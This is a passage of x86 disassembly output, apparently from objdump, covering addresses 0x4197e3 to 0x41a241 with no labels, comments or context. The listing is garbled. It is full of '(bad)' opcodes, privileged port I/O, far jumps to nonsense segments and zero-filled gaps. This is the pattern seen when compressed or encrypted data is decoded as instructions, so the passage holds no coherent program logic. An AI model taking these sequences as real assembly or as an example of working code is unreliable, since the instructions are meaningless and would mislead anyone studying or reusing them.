  4197e3:	ins    WORD PTR es:[edi],dx
  4197e5:	ret    
  4197e6:	push   cs
  4197e7:	aaa    
  4197e8:	xor    bh,BYTE PTR [ebx+0x60fe4ba0]
  4197ee:	inc    ebx
  4197ef:	sub    DWORD PTR [ebp+0x50],ecx
  4197f2:	cld    
  4197f3:	retf   0x6fd
  4197f6:	xchg   edx,eax
  4197f7:	rol    BYTE PTR [eax],cl
  4197f9:	(bad)  
  4197fa:	fyl2x  
  4197fc:	sub    bl,0xb6
  4197ff:	ror    BYTE PTR [edi+0x2e10ac2b],1
  419805:	or     BYTE PTR [ebp+0x20],0xed
  419809:	fbld   TBYTE PTR [edi-0x43]
  41980c:	cmp    dh,0x1f
  41980f:	(bad)  
  419810:	sbb    dh,BYTE PTR [esp+eiz*8]
  419813:	fild   QWORD PTR [edi-0x25]
  419816:	fs ins DWORD PTR es:[edi],dx
  419818:	jmp    0x4197cf
  41981a:	js     0x4197e1
  41981c:	pusha  
  41981d:	adc    eax,0x8070f8d3
  419822:	xchg   edx,eax
  419823:	fistp  DWORD PTR [eax]
  419825:	xor    esp,esp
  419827:	pop    esp
  419828:	mov    edx,0x1af8fd8f
  41982d:	push   ebp
  41982e:	xchg   edi,eax
  41982f:	dec    edi
  419830:	mov    BYTE PTR [ebx-0x28ea8ec4],bl
  419836:	div    BYTE PTR [ecx]
  419838:	lods   eax,DWORD PTR ds:[esi]
  419839:	adc    esi,DWORD PTR [eax+0x73f98f7f]
  41983f:	loope  0x4197dc
  419841:	push   es
  419842:	ins    BYTE PTR es:[edi],dx
  419843:	or     DWORD PTR [edi+0x26],edi
  419846:	sahf   
  419847:	push   ebp
  419848:	scas   eax,DWORD PTR es:[edi]
  419849:	mov    ds:0xfc85120e,eax
  41984e:	in     eax,dx
  41984f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419850:	or     al,0x7c
  419852:	pushf  
  419853:	inc    eax
  419854:	imul   ebx,DWORD PTR [eax],0x75
  419857:	(bad)  
  419858:	rol    BYTE PTR [ebx-0x6f],1
  41985b:	stos   BYTE PTR es:[edi],al
  41985c:	mov    dh,0x39
  41985e:	jmp    0x1e3:0x40115b94
  419865:	xor    eax,0xe221d6d5
  41986a:	sbb    eax,0xf701174f
  41986f:	loopne 0x41987a
  419871:	sub    DWORD PTR [ecx-0x7ed7ca97],ebx
  419877:	rol    DWORD PTR [esi],0x95
  41987a:	(bad)  
  41987b:	into   
  41987c:	rcl    BYTE PTR [edx-0x6c791125],1
  419882:	sahf   
  419883:	test   DWORD PTR [esi-0xcc50843],ebp
  419889:	mov    ds:0x773a5a3b,al
  41988e:	daa    
  41988f:	add    BYTE PTR ds:[eax],al
	...
  4198f2:	add    BYTE PTR [eax],al
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fucomp st(2)
  419901:	int3   
  419902:	sub    eax,0x10ecc60
  419907:	add    BYTE PTR [ecx+eax*1],al
  41990a:	add    BYTE PTR [eax],al
  41990c:	add    eax,0x77e48021
  419911:	fnstsw WORD PTR [edi-0x7d]
  419914:	sbb    ebx,esi
  419916:	or     BYTE PTR [eax-0x4b],0xe
  41991a:	and    al,0xa9
  41991c:	xor    dh,bh
  41991e:	loop   0x4198e1
  419920:	in     al,dx
  419921:	shl    ecx,0xac
  419924:	adc    al,0x9e
  419926:	add    dl,BYTE PTR [esi-0x4d]
  419929:	xor    edi,esp
  41992b:	or     DWORD PTR [ecx+0x2f],0x8dfbaf15
  419932:	xchg   esp,eax
  419933:	push   ds
  419934:	cmp    BYTE PTR [eax-0x31],0xc3
  419938:	xor    DWORD PTR [eax],edx
  41993a:	into   
  41993b:	arpl   WORD PTR es:[esi],bp
  41993e:	jnp    0x419940
  419940:	(bad)  
  419941:	sbb    dh,dl
  419943:	cmp    BYTE PTR [edx+eiz*2-0x64669324],bl
  41994a:	lods   al,BYTE PTR ss:[esi]
  41994c:	or     DWORD PTR [ecx],edx
  41994e:	xchg   ebp,eax
  41994f:	jle    0x4199ad
  419951:	inc    esp
  419952:	pop    esi
  419953:	pushf  
  419954:	sub    DWORD PTR [eax-0x420fa6a3],edi
  41995a:	push   ecx
  41995b:	sub    edx,ebp
  41995d:	sbb    eax,0x232d2ba5
  419962:	fisttp WORD PTR [esi]
  419964:	lods   al,BYTE PTR ds:[esi]
  419965:	imul   edi,eax,0xaeb021d5
  41996b:	sbb    al,BYTE PTR [eax-0x24]
  41996e:	add    BYTE PTR [ecx+0x8987a9d],dl
  419974:	sub    BYTE PTR [edi],0xcc
  419977:	push   ebp
  419978:	inc    eax
  419979:	shl    BYTE PTR [ecx],0x99
  41997c:	dec    edi
  41997d:	int3   
  41997e:	mov    cl,0x3e
  419980:	loope  0x419950
  419982:	mov    ds:0x9672567e,eax
  419987:	inc    ebp
  419988:	xor    BYTE PTR [eax],0x8f
  41998b:	out    dx,eax
  41998c:	push   ebp
  41998d:	add    al,0x9a
  41998f:	dec    eax
  419990:	and    esp,edx
  419992:	push   eax
  419993:	pop    eax
  419994:	mov    esp,0x10b5bd4
  419999:	lds    edx,FWORD PTR [eax+0x28ebaad3]
  41999f:	cmp    ecx,edx
  4199a1:	push   es
  4199a2:	retf   0x4df9
  4199a5:	sub    al,0x6
  4199a7:	dec    esi
  4199a8:	inc    eax
  4199a9:	sub    al,0x4
  4199ab:	sbb    DWORD PTR [eax],esi
  4199ad:	cld    
  4199ae:	jmp    0xa0673a39
  4199b3:	mov    edi,0x7d5df105
  4199b8:	mov    cs,WORD PTR [edi-0x524d8df1]
  4199be:	xchg   esi,eax
  4199bf:	(bad)  [edi+0x53cff7af]
  4199c5:	rol    esi,cl
  4199c7:	mov    BYTE PTR [ebp-0x55f4743b],ch
  4199cd:	in     eax,dx
  4199ce:	adc    DWORD PTR [esi+0x5caae94e],ecx
  4199d4:	and    al,0x7b
  4199d6:	mov    ds:0x5d65ad86,eax
  4199db:	cmp    DWORD PTR [ecx+eax*1+0x4a],edi
  4199df:	int3   
  4199e0:	push   esi
  4199e1:	adc    DWORD PTR [esi+eax*8-0x10],ecx
  4199e5:	jns    0x4199b3
  4199e7:	idiv   ecx
  4199e9:	das    
  4199ea:	dec    ebx
  4199eb:	sub    ecx,DWORD PTR [esi]
  4199ed:	sub    ah,al
  4199ef:	dec    esp
  4199f0:	das    
  4199f1:	cmc    
  4199f2:	clc    
  4199f3:	cwde   
  4199f4:	jne    0x41999b
  4199f6:	lds    esp,FWORD PTR [esi+ebp*8]
  4199f9:	pop    ecx
  4199fa:	aaa    
  4199fb:	or     bh,al
  4199fd:	push   DWORD PTR [edx]
  4199ff:	xchg   BYTE PTR ds:0x56cf5ba6,dh
  419a05:	sub    eax,DWORD PTR [ecx+0x25]
  419a08:	xor    ebx,DWORD PTR [ebx-0x4fe21582]
  419a0e:	mov    eax,0x83
	...
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0xfdc215d3
  419a81:	loope  0x419a12
  419a83:	xchg   al,dl
  419a85:	sgdtd  [eax]
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	ror    esi,0xd9
  419a8f:	mov    WORD PTR [edx],gs
  419a91:	lds    ebx,FWORD PTR [edi-0x168f1c45]
  419a97:	or     ch,bl
  419a99:	dec    edx
  419a9a:	sub    DWORD PTR [ebp+0x6e024fda],ecx
  419aa0:	adc    dh,dh
  419aa2:	cmp    DWORD PTR [esi],edx
  419aa4:	jbe    0x419a38
  419aa6:	lds    ebx,FWORD PTR [ebx+0x6445a13b]
  419aac:	push   0x64
  419aae:	into   
  419aaf:	cdq    
  419ab0:	addr16 (bad) 
  419ab2:	scas   al,BYTE PTR es:[edi]
  419ab3:	fild   WORD PTR ds:0xeee5730d
  419ab9:	and    al,0xc8
  419abb:	pushfw 
  419abd:	jnp    0x419ad7
  419abf:	or     al,0xab
  419ac1:	push   ebp
  419ac2:	mov    edx,0x3476072c
  419ac7:	xor    al,0x6d
  419ac9:	pushf  
  419aca:	mov    ch,0x5
  419acc:	sbb    eax,0x88506652
  419ad1:	js     0x419a6e
  419ad3:	inc    edi
  419ad4:	and    eax,0xe20aaae8
  419ad9:	out    dx,al
  419ada:	xor    BYTE PTR [edi-0x5a],bh
  419add:	in     eax,0x90
  419adf:	outs   dx,DWORD PTR ds:[esi]
  419ae0:	cmp    eax,0x22f03800
  419ae5:	mov    cl,0x4e
  419ae7:	mov    bh,0xcd
  419ae9:	jl     0x419b2c
  419aeb:	imul   edx,DWORD PTR [edx+edi*4+0x5567d3e7],0xfffffff4
  419af3:	jge    0x419a89
  419af5:	dec    eax
  419af6:	adc    dh,BYTE PTR [edi+0x178ae211]
  419afc:	mov    DWORD PTR [edx],esi
  419afe:	gs out dx,eax
  419b00:	push   esi
  419b01:	outs   dx,BYTE PTR ds:[esi]
  419b02:	mov    esp,0xaf4af33d
  419b07:	popa   
  419b08:	mov    esp,DWORD PTR [ecx]
  419b0a:	and    DWORD PTR [eax],edi
  419b0c:	retf   0x40fc
  419b0f:	or     BYTE PTR [ecx-0x2],ah
  419b12:	jae    0x419b04
  419b14:	ret    
  419b15:	sbb    ecx,esp
  419b17:	lea    edi,[eax]
  419b19:	adc    eax,0xdad12e56
  419b1e:	clc    
  419b1f:	sahf   
  419b20:	or     cl,BYTE PTR [esi+0x29482e1a]
  419b26:	push   0x85a244ea
  419b2b:	cmc    
  419b2c:	rcr    ch,1
  419b2e:	mov    edx,0x84807f60
  419b33:	shl    BYTE PTR [ebx],cl
  419b35:	aas    
  419b36:	mov    al,0x6a
  419b38:	sbb    bl,BYTE PTR [edi]
  419b3a:	adc    esi,esp
  419b3c:	outs   dx,DWORD PTR ds:[esi]
  419b3d:	inc    ebx
  419b3e:	in     al,0x8d
  419b40:	mov    ebx,0x9b9708ce
  419b45:	add    BYTE PTR [edi-0x63],al
  419b48:	mov    dh,0x7f
  419b4a:	or     BYTE PTR [ebx],0x71
  419b4d:	mov    ebx,0xda8f8c43
  419b52:	int    0x22
  419b54:	pushf  
  419b55:	popa   
  419b56:	inc    edi
  419b57:	jp     0x419b01
  419b59:	mov    ch,0x77
  419b5b:	mov    eax,0x5b25cb1a
  419b60:	pusha  
  419b61:	push   ecx
  419b62:	adc    cl,dl
  419b64:	in     eax,dx
  419b65:	mov    ch,0x80
  419b67:	fstp   TBYTE PTR [eax+eax*8-0x39317771]
  419b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b6f:	jnp    0x419b9c
  419b71:	jno    0x419bb3
  419b73:	out    0x9c,al
  419b75:	jno    0x419b03
  419b77:	sbb    edi,DWORD PTR ds:0xe3cd9aad
  419b7d:	push   eax
  419b7e:	xor    eax,0xb37dbd6f
  419b83:	in     al,0xc1
  419b85:	dec    edx
  419b86:	push   esi
  419b87:	jnp    0x419b2e
  419b89:	or     eax,0x3fbcaa18
  419b8e:	into   
  419b8f:	out    0x0,al
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x7f
  419c01:	add    al,ah
  419c03:	js     0x419bd9
  419c05:	adc    BYTE PTR [ecx],al
  419c07:	add    BYTE PTR [ecx+eax*1],al
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	std    
  419c0d:	scas   eax,DWORD PTR es:[edi]
  419c0e:	xor    eax,0x7b0222d5
  419c13:	call   0xc536:0x699b6389
  419c1a:	ror    BYTE PTR ds:0x1c71a9b4,0x3e
  419c21:	mov    BYTE PTR [eax+ebp*1-0x15b49acc],al
  419c28:	dec    ecx
  419c29:	call   0xf6c0e734
  419c2e:	imul   edx,edi,0xffffffab
  419c31:	sbb    esi,esp
  419c33:	push   esi
  419c35:	mov    ah,0x41
  419c37:	push   0x829a8d56
  419c3c:	out    dx,eax
  419c3d:	mov    cl,0xd4
  419c3f:	pop    es
  419c40:	jmp    0xf3dc:0xdec17aff
  419c47:	dec    ebp
  419c48:	pushf  
  419c49:	xor    ebx,DWORD PTR [ecx]
  419c4b:	jg     0x419ca7
  419c4d:	sub    eax,0xe632e995
  419c52:	pushf  
  419c53:	push   es
  419c54:	stos   BYTE PTR es:[edi],al
  419c55:	or     eax,0x34d549ba
  419c5a:	or     al,0x89
  419c5c:	dec    ebp
  419c5d:	pop    ss
  419c5e:	cmc    
  419c5f:	inc    ecx
  419c60:	dec    esi
  419c61:	iret   
  419c62:	cmp    al,0x53
  419c64:	ja     0x419c5d
  419c66:	popf   
  419c67:	pop    edi
  419c68:	mov    bl,0x2b
  419c6a:	add    eax,0x3a3812f3
  419c6f:	push   edx
  419c70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c71:	mov    esi,0xe23b56cd
  419c76:	push   ebx
  419c77:	addr16 xchg ebp,eax
  419c79:	xor    al,BYTE PTR ds:0x8f904a45
  419c7f:	mov    WORD PTR [ebx],?
  419c81:	mov    BYTE PTR [ebx+0x22bee29d],dl
  419c87:	data16 clc 
  419c89:	pusha  
  419c8a:	mov    eax,ds:0xf957698
  419c8f:	lds    edx,FWORD PTR [eax]
  419c91:	fidivr WORD PTR [ebp+0x28]
  419c94:	push   0xffffffaf
  419c96:	pop    es
  419c97:	dec    esi
  419c98:	fcom   QWORD PTR [eax-0x19]
  419c9b:	mov    cl,0xe9
  419c9d:	mov    bh,0xc6
  419c9f:	xchg   DWORD PTR [esi+eax*4-0x2a],ebp
  419ca3:	xor    BYTE PTR [ecx+0x34befc7],bl
  419ca9:	jne    0x419c8f
  419cab:	jmp    0xa58c:0xa7e59294
  419cb2:	cli    
  419cb3:	addr16 mov ecx,0x1b4439dc
  419cb9:	push   es
  419cba:	and    al,0x8
  419cbc:	out    0xc4,eax
  419cbe:	push   ebp
  419cbf:	mov    al,0xb5
  419cc1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cc3:	rcl    BYTE PTR [ebx],1
  419cc5:	pop    ss
  419cc6:	xor    dh,BYTE PTR [edi-0x119e0eb9]
  419ccc:	shl    DWORD PTR [edx-0x3666126e],0x4
  419cd3:	or     eax,0x3ffb98f3
  419cd8:	les    eax,FWORD PTR [edx]
  419cda:	inc    esp
  419cdb:	and    DWORD PTR [ebx+0x6e432bd9],edi
  419ce1:	sbb    BYTE PTR [esi],dl
  419ce3:	cmp    eax,0xbf29e82a
  419ce8:	push   edx
  419ce9:	shr    BYTE PTR [eax],cl
  419ceb:	dec    ecx
  419cec:	mov    eax,ds:0xee06663f
  419cf1:	mov    ecx,0x102493f2
  419cf6:	or     DWORD PTR [esi-0x5f4a7c4e],ebp
  419cfc:	cmp    al,0x71
  419cfe:	out    dx,al
  419cff:	leave  
  419d00:	and    ecx,esp
  419d02:	sub    eax,0x16ee96ac
  419d07:	ss sbb al,0x45
  419d0a:	fadd   st,st(7)
  419d0c:	sahf   
  419d0d:	mov    al,ds:0x826
	...
  419d72:	add    BYTE PTR [eax],al
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ss fcmovb st,st(7)
  419d81:	push   ecx
  419d82:	cwde   
  419d83:	jmp    0x104:0x111d8
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	repnz sbb al,0xb1
  419d8f:	loop   0x419d3f
  419d91:	call   0xfbd:0x1c379402
  419d98:	in     eax,0xf4
  419d9a:	call   0xcfdd6f67
  419d9f:	outs   dx,DWORD PTR ds:[esi]
  419da0:	cwde   
  419da1:	ror    DWORD PTR [ecx+0x4f73787a],0x4b
  419da8:	out    0x35,al
  419daa:	push   es
  419dab:	in     eax,dx
  419dac:	pop    ds
  419dad:	xchg   edx,eax
  419dae:	jmp    0x419dce
  419db0:	xchg   esp,eax
  419db1:	popa   
  419db2:	mov    BYTE PTR [edi+0xa],al
  419db5:	mov    eax,ds:0xc6cfc67a
  419dba:	addr16 loop 0x419e14
  419dbd:	and    eax,0xb04ea9fd
  419dc2:	inc    edi
  419dc3:	pop    ecx
  419dc4:	push   0xffffffc5
  419dc6:	hlt    
  419dc7:	sub    eax,0x539177ec
  419dcc:	and    eax,0xfe6a6ddb
  419dd1:	mov    al,0xa1
  419dd3:	adc    DWORD PTR [esi-0x56],edx
  419dd6:	gs popf 
  419dd8:	lock (bad) 
  419dda:	mov    BYTE PTR ds:0x52ed0273,bh
  419de0:	and    eax,0x893e8500
  419de5:	enter  0x3aa4,0x12
  419de9:	dec    ebp
  419dea:	jo     0x419e13
  419dec:	xor    al,0x8f
  419dee:	popf   
  419def:	add    eax,esp
  419df1:	jmp    0x419d81
  419df3:	adc    DWORD PTR [esi-0x11],edi
  419df6:	fwait
  419df7:	mov    ecx,0x2b4941e3
  419dfc:	jnp    0x419dc3
  419dfe:	jecxz  0x419d96
  419e00:	sub    al,0xc8
  419e02:	xacquire xchg DWORD PTR [ebp+0x6d9c2ac9],ebp
  419e09:	(bad)  
  419e0a:	arpl   WORD PTR [edx+0x47],cx
  419e0d:	xor    DWORD PTR [esi+eax*4+0x4e61caee],0xaaef3def
  419e18:	test   eax,edi
  419e1a:	(bad)  
  419e1b:	retf   
  419e1c:	leave  
  419e1d:	push   eax
  419e1e:	repnz pop ss
  419e20:	xchg   esi,ebx
  419e22:	bound  edx,QWORD PTR ds:0xbdd3122e
  419e28:	push   ds
  419e29:	push   0x52fb55a2
  419e2e:	sbb    DWORD PTR [ecx+0xa498e9f],edx
  419e34:	out    0x34,eax
  419e36:	jns    0x419e82
  419e38:	rcr    BYTE PTR [esi+0x48dc52e2],1
  419e3e:	aas    
  419e3f:	mov    es,WORD PTR [edx+0x1a]
  419e42:	daa    
  419e43:	pop    esi
  419e44:	imul   ebp,DWORD PTR [edi-0x41],0xffffff8c
  419e48:	lahf   
  419e49:	sub    eax,0xfc1f8b72
  419e4e:	repz fwait
  419e50:	data16 mov al,ds:0xe9f651bd
  419e56:	mov    db7,esp
  419e59:	dec    ebx
  419e5a:	inc    ebp
  419e5b:	inc    edi
  419e5c:	rcl    DWORD PTR [ebx-0x684cc32e],0xa
  419e63:	retf   
  419e64:	adc    eax,0xece036b8
  419e69:	ret    
  419e6a:	adc    BYTE PTR [eax+0x2066c1c1],cl
  419e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e71:	mov    ch,0x80
  419e73:	das    
  419e74:	loopne 0x419df7
  419e76:	pop    esi
  419e77:	dec    esp
  419e78:	jl     0x419e1b
  419e7a:	mov    esi,ebp
  419e7c:	int3   
  419e7d:	and    dh,al
  419e7f:	xlat   BYTE PTR ds:[ebx]
  419e80:	push   ds
  419e81:	xlat   BYTE PTR ds:[ebx]
  419e82:	xchg   esp,eax
  419e83:	pop    ebx
  419e84:	push   ds
  419e85:	std    
  419e86:	out    dx,eax
  419e87:	inc    edi
  419e88:	mov    ebx,0x895d696c
  419e8d:	mov    bl,0xcb
  419e8f:	push   ds
	...
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	and    BYTE PTR [ebx+0x12dc63b6],dl
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    al,0x1
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	jne    0x419ee8
  419f0e:	mov    dl,0xc4
  419f10:	fwait
  419f11:	xchg   esp,eax
  419f12:	fwait
  419f13:	add    ah,BYTE PTR ds:0x7fba7f70
  419f19:	and    BYTE PTR [ebp+0x79c036b6],bh
  419f1f:	push   ebx
  419f20:	stos   DWORD PTR es:[edi],eax
  419f21:	fucomip st,st(6)
  419f23:	fcom   DWORD PTR [esi-0x64]
  419f26:	jge    0x419ef6
  419f28:	clc    
  419f29:	inc    eax
  419f2a:	stc    
  419f2b:	repz mov esp,ebx
  419f2e:	(bad)  
  419f2f:	cld    
  419f30:	outs   dx,BYTE PTR ds:[esi]
  419f31:	bnd jo 0x419f03
  419f34:	cmp    ebx,DWORD PTR [edx]
  419f36:	clc    
  419f37:	aaa    
  419f38:	imul   edx,DWORD PTR [edi],0xffffffeb
  419f3b:	cmp    BYTE PTR [esp+edi*1+0x374ae3db],dl
  419f42:	xchg   esi,eax
  419f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f44:	sub    DWORD PTR [edi+ebx*1+0x58],edi
  419f48:	cmp    BYTE PTR [ecx-0x6d],bh
  419f4b:	pop    eax
  419f4c:	inc    ebx
  419f4d:	imul   esp,DWORD PTR ds:0xb5294b40,0xfb1ef215
  419f57:	jecxz  0x419faa
  419f59:	(bad)  
  419f5b:	shr    BYTE PTR [ebx],0x86
  419f5e:	sub    DWORD PTR ds:0xedc8588,edi
  419f64:	xchg   ebp,eax
  419f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f66:	xchg   esi,eax
  419f67:	sar    DWORD PTR [edx-0x677e6d62],0x0
  419f6e:	xlat   BYTE PTR ds:[ebx]
  419f6f:	cmp    DWORD PTR [esi],ebx
  419f71:	sbb    DWORD PTR [ecx-0x37],ecx
  419f74:	xor    dh,BYTE PTR [ebx]
  419f76:	daa    
  419f77:	out    0xb5,al
  419f79:	ret    
  419f7a:	push   esi
  419f7b:	xchg   esp,eax
  419f7c:	sbb    eax,DWORD PTR [edx+0x7a236aaa]
  419f82:	fwait
  419f83:	repz cmp ebp,esp
  419f86:	sbb    al,bh
  419f88:	mov    bl,0x11
  419f8a:	mov    al,ds:0x21706ab8
  419f8f:	cwde   
  419f90:	mov    al,0x97
  419f92:	xchg   edi,eax
  419f93:	hlt    
  419f94:	popf   
  419f95:	add    eax,0x68aead7c
  419f9a:	push   edx
  419f9b:	and    eax,0xf0c44203
  419fa0:	daa    
  419fa1:	push   ebp
  419fa2:	sbb    ah,BYTE PTR [edi+eax*1+0x4d0437b2]
  419fa9:	imul   ebx,esp,0x2b
  419fac:	test   al,0xa4
  419fae:	mov    ebx,0x8c47714b
  419fb3:	call   0xacbeac43
  419fb8:	xchg   ecx,eax
  419fb9:	xor    eax,0xd17d83ed
  419fbe:	outs   dx,BYTE PTR ds:[esi]
  419fbf:	in     eax,0xcd
  419fc1:	outs   dx,BYTE PTR ds:[esi]
  419fc2:	adc    esi,ebx
  419fc4:	retf   0xb8bc
  419fc7:	(bad)  
  419fca:	sbb    esi,DWORD PTR [esi-0x6ff4d414]
  419fd0:	push   es
  419fd1:	adc    dh,ah
  419fd3:	push   0xdccedd32
  419fd8:	mov    edx,0x326fa393
  419fdd:	jns    0x41a04b
  419fdf:	or     ebx,DWORD PTR cs:[edx+0x7b685b30]
  419fe6:	fisttp QWORD PTR [edx+0x732c27c]
  419fec:	repz sar DWORD PTR [esi+0x15],0x4c
  419ff1:	js     0x41a028
  419ff3:	cs inc ebx
  419ff5:	ror    BYTE PTR [ebx],cl
  419ff7:	stos   DWORD PTR es:[edi],eax
  419ff8:	(bad)  
  419ffa:	es std 
  419ffc:	sub    DWORD PTR [edi+0x4dc83464],esp
  41a002:	mov    bl,0xd0
  41a004:	push   ecx
  41a005:	leave  
  41a006:	mov    dh,0x5e
  41a008:	ror    DWORD PTR [eax],0x1b
  41a00b:	pusha  
  41a00c:	mov    ebp,0xdeb27d
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x55],bh
  41a081:	std    
  41a082:	push   0x113e009
  41a087:	add    BYTE PTR [ecx+eax*1],al
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	dec    edi
  41a08d:	test   esp,esp
  41a08f:	add    DWORD PTR [ecx+0x4b],eax
  41a092:	lahf   
  41a093:	mov    edx,0xf4ac7b56
  41a098:	xchg   BYTE PTR [edx+0x6f],al
  41a09b:	mov    eax,ds:0x8d043fa5
  41a0a0:	mov    esp,0x2879bd80
  41a0a5:	jg     0x41a0bc
  41a0a7:	mov    bh,0x4b
  41a0a9:	scas   eax,DWORD PTR es:[edi]
  41a0aa:	adc    al,0xfe
  41a0ac:	jb     0x41a0c8
  41a0ae:	and    al,0xa1
  41a0b0:	adc    eax,0x1124ee19
  41a0b5:	lods   al,BYTE PTR ds:[esi]
  41a0b6:	xor    BYTE PTR [edi+esi*1],ah
  41a0b9:	or     al,0x6c
  41a0bb:	and    ebp,esp
  41a0bd:	scas   al,BYTE PTR es:[edi]
  41a0be:	inc    ebx
  41a0bf:	adc    eax,0x13c2c8e5
  41a0c4:	adc    ah,0x18
  41a0c7:	sub    dl,dl
  41a0c9:	dec    esi
  41a0ca:	scas   eax,DWORD PTR es:[edi]
  41a0cb:	mov    eax,0x8a4fbbcf
  41a0d0:	(bad)  
  41a0d1:	rcr    BYTE PTR [ebx-0xac6ea6b],1
  41a0d7:	sbb    ch,dh
  41a0d9:	jbe    0x41a142
  41a0db:	lods   al,BYTE PTR ds:[esi]
  41a0dc:	int3   
  41a0dd:	rol    BYTE PTR [ecx-0x66],cl
  41a0e0:	push   eax
  41a0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0e2:	push   eax
  41a0e3:	out    0x1f,eax
  41a0e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0e6:	inc    ebp
  41a0e7:	mov    edi,0xd0a250a2
  41a0ec:	and    DWORD PTR [ebp+0xf],ecx
  41a0ef:	sti    
  41a0f0:	xor    eax,0x5454dae3
  41a0f5:	out    dx,eax
  41a0f6:	clc    
  41a0f7:	int3   
  41a0f8:	pushf  
  41a0f9:	push   ebp
  41a0fa:	leave  
  41a0fb:	jg     0x41a0d2
  41a0fd:	mov    BYTE PTR [ebx],bl
  41a0ff:	xchg   DWORD PTR [esi+edi*1+0x73],edx
  41a103:	or     DWORD PTR ds:0x61cc3004,ebx
  41a109:	rcl    BYTE PTR [eax-0x3a6637f5],0xfc
  41a110:	(bad)  
  41a111:	loop   0x41a175
  41a113:	pop    ss
  41a114:	mov    edx,0x142c42ab
  41a119:	sbb    esi,DWORD PTR [edx-0x1f]
  41a11c:	into   
  41a11d:	fst    QWORD PTR [ebp+ecx*2+0x51537a89]
  41a124:	and    BYTE PTR [edx-0x1e],dh
  41a127:	and    esp,DWORD PTR [ebp+ebp*1-0x4ebdbde9]
  41a12e:	push   edx
  41a12f:	cmp    DWORD PTR [eax],esp
  41a131:	(bad)  
  41a133:	mov    cl,0x14
  41a135:	jae    0x41a1a2
  41a137:	xchg   edx,eax
  41a138:	pop    ds
  41a139:	mov    ds:0x3c7277c9,al
  41a13e:	push   edx
  41a13f:	loopne 0x41a163
  41a141:	sahf   
  41a142:	jmp    0x41a111
  41a144:	ds js  0x41a197
  41a147:	pop    edx
  41a148:	and    ah,BYTE PTR [esi-0x50]
  41a14b:	mov    DWORD PTR [esi],ebp
  41a14d:	xor    DWORD PTR [eax-0x4f],ebp
  41a150:	add    DWORD PTR [ecx-0x7a],ebx
  41a153:	pushf  
  41a154:	or     al,0x82
  41a156:	mov    bl,0x6a
  41a158:	pop    edi
  41a159:	mov    ebp,0x3db34467
  41a15e:	xchg   esi,eax
  41a15f:	fmul   QWORD PTR [ecx]
  41a161:	sub    BYTE PTR [edx+0x65],ch
  41a164:	xor    DWORD PTR [ecx+0x7e],0xb3adc3bc
  41a16b:	imul   ebx,DWORD PTR [ebx],0x3c
  41a16e:	dec    ebx
  41a16f:	icebp  
  41a170:	xor    edi,DWORD PTR [edi]
  41a172:	mov    ch,0x64
  41a174:	and    DWORD PTR [eax],ebp
  41a176:	je     0x41a1a2
  41a178:	jno    0x41a1e7
  41a17a:	push   ss
  41a17b:	in     al,dx
  41a17c:	jmp    0x41a19b
  41a17e:	sbb    al,0x2b
  41a180:	out    0x24,eax
  41a182:	test   DWORD PTR [edi+0x2f],0x13b7d4fb
  41a189:	pop    ss
  41a18a:	dec    ebx
  41a18b:	mov    BYTE PTR [ebp+0x45d75c],bh
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	(bad)
  41a203:	sub    esp,esp
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	je     0x41a192
  41a20e:	mov    ebx,0x34f1da3c
  41a213:	cli    
  41a214:	pop    edx
  41a215:	push   0xffffffa4
  41a217:	loop   0x41a214
  41a219:	xor    ebx,eax
  41a21b:	mov    cl,0xe4
  41a21d:	mov    ah,0x41
  41a21f:	sbb    eax,0x63fbc826
  41a224:	cmp    dl,bl
  41a226:	clc    
  41a227:	call   0xd4ad:0x4b239d80
  41a22e:	sti    
  41a22f:	neg    dl
  41a231:	lock add cl,BYTE PTR [eax+0x66]
  41a235:	bnd jae 0x41a1bb
  41a238:	inc    eax
  41a239:	sti    
  41a23a:	cmp    BYTE PTR [ebp-0x78],cl
  41a23d:	lea    esi,[ebx]
  41a23f:	int3   
  41a240:	popa   
  41a241:	push   ds
